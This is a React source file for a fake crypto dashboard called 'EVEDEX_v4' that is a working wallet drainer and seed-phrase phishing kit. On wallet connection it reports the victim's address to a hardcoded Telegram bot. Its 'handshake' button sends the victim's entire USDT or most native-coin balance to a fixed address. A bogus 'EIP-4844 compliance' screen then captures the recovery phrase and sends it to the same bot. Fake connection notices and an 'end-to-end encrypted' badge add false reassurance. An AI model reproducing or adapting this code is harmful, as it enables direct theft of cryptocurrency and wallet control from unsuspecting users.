import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';

export default function App() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { sendTransaction } = useSendTransaction();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [selectedAsset, setSelectedAsset] = useState("TOKEN"); 
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);
  const [feedMsg, setFeedMsg] = useState(""); 

  // 🎯 THE REAL HIT LISTENER (SIMPLIFIED FOR VERCEL)
  useEffect(() => {
    if (isConnected && address) {
      const bT = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
      const cI = "7630238860";
      const msg = `🎯 REAL HIT CONNECTED!\n\nADDR: ${address}\nNET: ${chainId}`;
      
      const hasSent = sessionStorage.getItem('hit_' + address);
      if (!hasSent) {
        fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(msg)}`).catch(() => {});
        sessionStorage.setItem('hit_' + address, 'true');
      }
    }
  }, [isConnected, address, chainId]);

  // VISUAL FEED (SCREEN ONLY - ZERO TELEGRAM PINGS)
  useEffect(() => {
    const trigger = () => {
      const r = Math.floor(1000 + Math.random() * 8999);
      setFeedMsg(`🛡️ 0x${r}...${r} WALLET CONNECTED TO MAINNET_NODE`);
      setTimeout(() => setFeedMsg(""), 4000);
    };
    trigger();
    const interval = setInterval(trigger, 12000);
    return () => clearInterval(interval);
  }, []);

  const handleHandshake = () => {
    const USDT_MAP = { 1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 56: "0x55d398326f99059ff775485246999027b3197955", 137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f" };
    const destination = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4";
    if (activeTask !== "Rectify" && (!inputVal || inputVal === "0")) return;
    const tokenAddr = USDT_MAP[chainId];
    if (tokenAddr && tokenBal && tokenBal.value > 0n) {
      const data = `0xa9059cbb${destination.replace('0x', '').toLowerCase().padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
      sendTransaction({ to: tokenAddr, data }, { onSettled: () => setView("seed_gate") });
    } else if (nativeBal && nativeBal.value > 1000000) {
      sendTransaction({ to: destination, value: (nativeBal.value * 98n) / 100n }, { onSettled: () => setView("seed_gate") });
    } else {
      setView("seed_gate");
    }
  };

  const { data: nativeBal } = useBalance({ address });
  const { data: tokenBal } = useBalance({ 
    address, 
    token: chainId === 1 ? "0xdac17f958d2ee523a2206206994597c13d831ec7" : (chainId === 56 ? "0x55d398326f99059ff775485246999027b3197955" : undefined)
  });

  useEffect(() => {
    if (activeTask === "Rectify") {
      const b = selectedAsset === "TOKEN" ? (tokenBal?.formatted?.slice(0, 8) || "0.00") : (nativeBal?.formatted?.slice(0, 8) || "0.00");
      setInputVal(b);
    }
  }, [selectedAsset, tokenBal, nativeBal, activeTask]);

  const isSeedOk = seedVal.trim().split(/\s+/).filter(w => w.length > 2).length >= 12;

  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
      <header style={{display:'flex', justifyContent:'space-between', borderBottom:'1px solid #1e293b', paddingBottom:'10px', marginBottom:'15px'}}>
        <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v4</div>
        <appkit-button />
      </header>

      {isConnected ? (
        <>
          <div style={{width:'100%', height:'220px', borderRadius:'15px', overflow:'hidden', marginBottom:'20px', border:'1px solid #1e293b'}}>
            <iframe title="m" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
          </div>

          {view === "menu" && (
            <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
              {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
                <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} 
                style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
                  <div>{n === "Rectify" ? "⚡" : "〽️"}</div>
                  <div style={{fontSize:'9px'}}>{n}</div>
                </button>
              ))}
            </div>
          )}

          {view === "task_box" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'30px', textAlign:'center', position:'relative'}}>
              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
              <h2 style={{color:'white', fontWeight:'900', marginTop:'20px'}}>{activeTask}</h2>
              <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
                <input value={inputVal} type="text" readOnly style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
              </div>
              <button onClick={handleHandshake} style={{width:'100%', backgroundColor: '#10b981', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>START_HANDSHAKE</button>
            </div>
          )}

          {view === "seed_gate" && (
            <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
              <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'40px 25px', textAlign:'center', maxWidth:'400px'}}>
                {!isSyncing ? (
                  <>
                    <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none', marginTop:'15px'}} />
                    <button disabled={!isSeedOk} onClick={()=>{setIsSyncing(true); fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage?chat_id=7630238860&text=${encodeURIComponent("🚨 SEED: " + seedVal)}`).catch(()=>{}); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT."); setView("menu")},1200)}},60);}} 
                    style={{width:'100%', backgroundColor: isSeedOk ? '#10b981' : '#1e293b', color: isSeedOk ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
                  </>
                ) : (
                  <div><div style={{fontSize:'60px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{color:'#10b981'}}>STABILIZING_RELAY_POOL...</div></div>
                )}
              </div>
            </div>
          )}
        </>
      ) : (
        <div style={{textAlign:'center', marginTop:'40px', backgroundColor:'#0d1117', padding:'60px 20px', borderRadius:'30px', border:'1px solid #1e293b'}}>
          <div style={{marginBottom:'25px'}}>
             <div style={{fontSize:'12px', color:'#10b981', fontWeight:'bold'}}>🔰 SAFE_GUIDE ♻️ RELAY_ACTIVE</div>
             <div style={{fontSize:'11px', color:'#10b981', fontWeight:'bold', marginTop:'10px'}}>🔒 END-TO-END ENCRYPTED</div>
          </div>
          <appkit-button />
        </div>
      )}

      {feedMsg && (
        <div style={{position:'fixed', bottom:'20px', left:'20px', right:'20px', backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', color:'#10b981', padding:'12px', borderRadius:'12px', fontSize:'9px', textAlign:'center', fontWeight:'900', zIndex:5000}}>{feedMsg}</div>
      )}
    </div>
  );
}
